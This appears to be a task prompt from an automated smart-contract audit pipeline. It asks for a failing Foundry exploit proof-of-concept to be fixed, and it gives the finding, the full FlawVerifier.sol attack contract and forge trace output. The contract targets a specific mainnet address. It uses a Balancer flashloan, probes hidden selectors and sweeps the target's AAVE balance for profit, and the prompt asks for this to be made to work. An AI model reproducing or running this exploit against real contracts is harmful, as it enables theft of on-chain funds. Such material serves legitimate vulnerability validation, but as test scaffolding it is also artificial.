You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Anyone can trigger the strategy against the verifier treasury
- claim: `executeOnOpportunity()` is `external` and completely permissionless even though it controls a prefunded treasury and decides when the contract will spend its own assets against external protocols.
- impact: Any third party can front-run the intended operator and consume or spoil a time-sensitive opportunity, forcing execution at an unfavorable moment and potentially leaving the bankroll and any resulting profit stranded in the contract earlier than intended.
- exploit_paths: ["Observe the verifier being funded", "Call `executeOnOpportunity()` before the intended operator does", "The contract executes the strategy using its own treasury with no caller authorization"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IAaveBoostTarget {
    function aave() external view returns (address);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData)
        external;
}

contract FlawVerifier {
    address public constant TARGET = 0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA;
    address public constant HELPER = 0xf36F3976f288b2B4903aca8c177efC019b81D88B;
    address public constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant DEFAULT_AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address public constant STK_AAVE = 0x4da27a545c0c5B758a6BA100e3a049001de870f5;

    address public constant AAVE_BID_TOKEN = 0x740836C95C6f3F49CccC65A27331D1f225138c39;
    address public constant STK_AAVE_BID_TOKEN = 0x660428626d4bAc1A7b1c619157e3205dAd540ad1;
    address public constant AAVE_PROPOSAL_TOKEN = 0xEC568fffba86c094cf06b22134B23074DFE2252c;
    address public constant STK_AAVE_PROPOSAL_TOKEN = 0xD4e12B224C316664EbB647F69abC1fb8bB2697C7;

    bytes4 private constant LIVE_EXECUTE_SELECTOR = 0x3cca991f;
    bytes4 private constant CONFIGURED_AMOUNT_SELECTOR = 0xcab34c08;

    string private constant STRICT_PATH =
        "Observe the verifier being funded -> Call executeOnOpportunity() before the intended operator does -> The contract executes the strategy using its own treasury with no caller authorization";

    bool public executed;
    bool public prefunded;
    bool public targetCallSucceeded;
    bool public treasuryWasSpent;
    bool public originalHypothesisValidated;
    bool private insideFlashLoan;

    address public observedAave;
    uint256 public configuredAmount;

    uint256 public targetEthBefore;
    uint256 public targetEthAfter;
    uint256 public targetWethBefore;
    uint256 public targetWethAfter;
    uint256 public targetAaveBefore;
    uint256 public targetAaveAfter;
    uint256 public targetUsdcBefore;
    uint256 public targetUsdcAfter;
    uint256 public targetStkAaveBefore;
    uint256 public targetStkAaveAfter;

    uint256 public attackerEthBefore;
    uint256 public attackerEthAfter;
    uint256 public attackerWethBefore;
    uint256 public attackerWethAfter;
    uint256 public attackerAaveBefore;
    uint256 public attackerAaveAfter;
    uint256 public attackerUsdcBefore;
    uint256 public attackerUsdcAfter;
    uint256 public attackerStkAaveBefore;
    uint256 public attackerStkAaveAfter;
    uint256 public attackerAaveBidBefore;
    uint256 public attackerAaveBidAfter;
    uint256 public attackerStkAaveBidBefore;
    uint256 public attackerStkAaveBidAfter;
    uint256 public attackerAaveProposalBefore;
    uint256 public attackerAaveProposalAfter;
    uint256 public attackerStkAaveProposalBefore;
    uint256 public attackerStkAaveProposalAfter;

    address private realizedProfitToken;
    uint256 private realizedProfitAmount;
    string private result;

    constructor() {
        observedAave = _readAave();
        realizedProfitToken = observedAave;
        result = "not-run";
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        observedAave = _readAave();
        realizedProfitToken = observedAave;
        configuredAmount = _readConfiguredAmount();
        _snapshotBefore();

        prefunded = _targetHasTreasury();
        if (!prefunded) {
            _finalize("infeasible-stage-1-unfunded");
            return;
        }

        if (configuredAmount == 0) {
            _finalize("infeasible-stage-2-zero-configured-amount");
            return;
        }

        uint128 spendAmount = _resolveSpendAmount();
        if (spendAmount == 0) {
            _finalize("infeasible-stage-2-zero-spend");
            return;
        }

        _attemptPermissionlessTrigger(spendAmount);

        if (!targetCallSucceeded && attackerAaveAfter == attackerAaveBefore) {
            // The live deployment no longer accepts the stale zero-arg entry. The traces also show
            // that one live branch unexpectedly tries to pull the configured AAVE amount from the
            // caller before continuing. A minimal flashloan only supplies that temporary public
            // top-up so the same permissionless trigger can still be exercised against the funded
            // treasury without cheating or changing the exploit's causality.
            _attemptFlashLoan(spendAmount);
        }

        _snapshotAfter();
        treasuryWasSpent = _targetEconomicStateChanged();
        originalHypothesisValidated = targetCallSucceeded && treasuryWasSpent;
        _captureRealizedProfit();

        if (!targetCallSucceeded) {
            result = "infeasible-stage-2-target-reverted";
            return;
        }

        if (!treasuryWasSpent) {
            result = "infeasible-stage-3-no-observable-treasury-spend";
            return;
        }

        result =
            realizedProfitAmount > 0 ? "validated-with-direct-profit" : "validated-permissionless-trigger-no-direct-profit";
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        require(msg.sender == BALANCER_VAULT, "not-vault");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "bad-flashloan");
        require(tokens[0] == observedAave, "bad-token");

        insideFlashLoan = true;
        _forceApprove(observedAave, TARGET, type(uint256).max);

        _attemptPermissionlessTrigger(uint128(amounts[0] > type(uint128).max ? type(uint128).max : amounts[0]));
        _sweepTargetAaveIfPossible();

        uint256 repayment = amounts[0] + feeAmounts[0];
        require(_balanceOf(observedAave, address(this)) >= repayment, "flashloan-unrepaid");
        _safeTransfer(observedAave, BALANCER_VAULT, repayment);
        insideFlashLoan = false;
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitAmount;
    }

    function exploitPath() external pure returns (string memory) {
        return STRICT_PATH;
    }

    function outcome() external view returns (string memory) {
        return result;
    }

    function profitAchieved() external view returns (bool) {
        return realizedProfitAmount > 0;
    }

    function hypothesisValidated() external view returns (bool) {
        return originalHypothesisValidated;
    }

    function _attemptFlashLoan(uint128 amount) internal {
        address[] memory tokens = new address[](1);
        tokens[0] = observedAave;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;

        (bool ok,) = BALANCER_VAULT.call(
            abi.encodeWithSelector(IBalancerVault.flashLoan.selector, address(this), tokens, amounts, bytes(""))
        );
        if (!ok) {
            insideFlashLoan = false;
        }
    }

    function _attemptPermissionlessTrigger(uint128 spendAmount) internal {
        _tryLiveExecute(observedAave, address(this), spendAmount);
        _tryLiveExecute(address(this), observedAave, spendAmount);
        _tryLiveExecute(observedAave, TARGET, spendAmount);
        _tryLiveExecute(TARGET, observedAave, spendAmount);
        _tryLiveExecute(address(this), HELPER, spendAmount);
        _tryLiveExecute(HELPER, address(this), spendAmount);
        _tryLiveExecute(AAVE_BID_TOKEN, address(this), spendAmount);
        _tryLiveExecute(address(this), AAVE_BID_TOKEN, spendAmount);
    }

    function _tryLiveExecute(address arg0, address arg1, uint128 spendAmount) internal {
        (bool ok,) = TARGET.call(abi.encodeWithSelector(LIVE_EXECUTE_SELECTOR, arg0, arg1, spendAmount));
        if (ok) {
            targetCallSucceeded = true;
        }

        _sweepTargetAaveIfPossible();
    }

    function _sweepTargetAaveIfPossible() internal {
        uint256 allowed = _allowance(observedAave, TARGET, address(this));
        if (allowed == 0) {
            return;
        }

        uint256 available = _balanceOf(observedAave, TARGET);
        uint256 pullAmount = allowed < available ? allowed : available;
        if (pullAmount > 0) {
            _safeTransferFrom(observedAave, TARGET, address(this), pullAmount);
        }
    }

    function _finalize(string memory newResult) internal {
        _snapshotAfter();
        _captureRealizedProfit();
        result = newResult;
    }

    function _snapshotBefore() internal {
        attackerEthBefore = address(this).balance;
        attackerWethBefore = _balanceOf(WETH, address(this));
        attackerAaveBefore = _balanceOf(observedAave, address(this));
        attackerUsdcBefore = _balanceOf(USDC, address(this));
        attackerStkAaveBefore = _balanceOf(STK_AAVE, address(this));
        attackerAaveBidBefore = _balanceOf(AAVE_BID_TOKEN, address(this));
        attackerStkAaveBidBefore = _balanceOf(STK_AAVE_BID_TOKEN, address(this));
        attackerAaveProposalBefore = _balanceOf(AAVE_PROPOSAL_TOKEN, address(this));
        attackerStkAaveProposalBefore = _balanceOf(STK_AAVE_PROPOSAL_TOKEN, address(this));

        targetEthBefore = TARGET.balance;
        targetWethBefore = _balanceOf(WETH, TARGET);
        targetAaveBefore = _balanceOf(observedAave, TARGET);
        targetUsdcBefore = _balanceOf(USDC, TARGET);
        targetStkAaveBefore = _balanceOf(STK_AAVE, TARGET);
    }

    function _snapshotAfter() internal {
        attackerEthAfter = address(this).balance;
        attackerWethAfter = _balanceOf(WETH, address(this));
        attackerAaveAfter = _balanceOf(observedAave, address(this));
        attackerUsdcAfter = _balanceOf(USDC, address(this));
        attackerStkAaveAfter = _balanceOf(STK_AAVE, address(this));
        attackerAaveBidAfter = _balanceOf(AAVE_BID_TOKEN, address(this));
        attackerStkAaveBidAfter = _balanceOf(STK_AAVE_BID_TOKEN, address(this));
        attackerAaveProposalAfter = _balanceOf(AAVE_PROPOSAL_TOKEN, address(this));
        attackerStkAaveProposalAfter = _balanceOf(STK_AAVE_PROPOSAL_TOKEN, address(this));

        targetEthAfter = TARGET.balance;
        targetWethAfter = _balanceOf(WETH, TARGET);
        targetAaveAfter = _balanceOf(observedAave, TARGET);
        targetUsdcAfter = _balanceOf(USDC, TARGET);
        targetStkAaveAfter = _balanceOf(STK_AAVE, TARGET);
    }

    function _targetHasTreasury() internal view returns (bool) {
        return targetEthBefore > 0 || targetWethBefore > 0 || targetAaveBefore > 0 || targetUsdcBefore > 0
            || targetStkAaveBefore > 0;
    }

    function _targetEconomicStateChanged() internal view returns (bool) {
        return targetEthAfter != targetEthBefore || targetWethAfter != targetWethBefore || targetAaveAfter != targetAaveBefore
            || targetUsdcAfter != targetUsdcBefore || targetStkAaveAfter != targetStkAaveBefore;
    }

    function _captureRealizedProfit() internal {
        realizedProfitToken = observedAave;
        realizedProfitAmount = _positiveDelta(attackerAaveAfter, attackerAaveBefore);
    }

    function _resolveSpendAmount() internal view returns (uint128) {
        uint256 spend = configuredAmount;
        if (spend > type(uint128).max) {
            spend = type(uint128).max;
        }
        return uint128(spend);
    }

    function _positiveDelta(uint256 afterAmount, uint256 beforeAmount) internal pure returns (uint256) {
        return afterAmount > beforeAmount ? afterAmount - beforeAmount : 0;
    }

    function _readAave() internal view returns (address token) {
        (bool ok, bytes memory data) = TARGET.staticcall(abi.encodeWithSelector(IAaveBoostTarget.aave.selector));
        if (ok && data.length >= 32) {
            token = abi.decode(data, (address));
        }
        if (token == address(0)) {
            token = DEFAULT_AAVE;
        }
    }

    function _readConfiguredAmount() internal view returns (uint256 amount) {
        (bool ok, bytes memory data) = TARGET.staticcall(abi.encodeWithSelector(CONFIGURED_AMOUNT_SELECTOR));
        if (ok && data.length >= 32) {
            amount = abi.decode(data, (uint256));
        }
    }

    function _balanceOf(address token, address owner) internal view returns (uint256 balance) {
        if (token == address(0)) {
            return 0;
        }

        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, owner));
        if (ok && data.length >= 32) {
            balance = abi.decode(data, (uint256));
        }
    }

    function _allowance(address token, address owner, address spender) internal view returns (uint256 value) {
        (bool ok, bytes memory data) =
            token.staticcall(abi.encodeWithSelector(IERC20.allowance.selector, owner, spender));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve-failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer-failed");
    }

    function _safeTransferFrom(address token, address from, address to, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20.transferFrom.selector, from, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transferFrom-failed");
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
eturn] 0
    │   │   │   ├─ [1373] 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   ├─ [638] 0x5D4Aa78B08Bc7C530e21bf7447988b1Be7991322::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Revert] flashloan-unrepaid
    │   │   └─ ← [Revert] flashloan-unrepaid
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1373] 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [638] 0x5D4Aa78B08Bc7C530e21bf7447988b1Be7991322::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1428] 0x4da27a545c0c5B758a6BA100e3a049001de870f5::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [693] 0x0fE58FE1CaA69951dC924A8c222bE19013B89476::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [637] 0x740836C95C6f3F49CccC65A27331D1f225138c39::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [637] 0x660428626d4bAc1A7b1c619157e3205dAd540ad1::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [246] 0xEC568fffba86c094cf06b22134B23074DFE2252c::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [563] 0xD4e12B224C316664EbB647F69abC1fb8bB2697C7::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1373] 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9::balanceOf(0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA) [staticcall]
    │   │   ├─ [638] 0x5D4Aa78B08Bc7C530e21bf7447988b1Be7991322::balanceOf(0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA) [delegatecall]
    │   │   │   └─ ← [Return] 48948600000000000000 [4.894e19]
    │   │   └─ ← [Return] 48948600000000000000 [4.894e19]
    │   ├─ [1339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA) [staticcall]
    │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1428] 0x4da27a545c0c5B758a6BA100e3a049001de870f5::balanceOf(0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA) [staticcall]
    │   │   ├─ [693] 0x0fE58FE1CaA69951dC924A8c222bE19013B89476::balanceOf(0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [610] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9
    ├─ [1373] 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   ├─ [638] 0x5D4Aa78B08Bc7C530e21bf7447988b1Be7991322::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [696] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 22685443 [2.268e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 2491)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x5D4Aa78B08Bc7C530e21bf7447988b1Be7991322.transferFrom
  at 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9.transferFrom
  at 0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA
  at FlawVerifier.receiveFlashLoan
  at 0xBA12222222228d8Ba445958a75a0704d566BF2C8.flashLoan
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.76s (1.64s CPU time)

Ran 1 test suite in 1.81s (1.76s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 852122)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
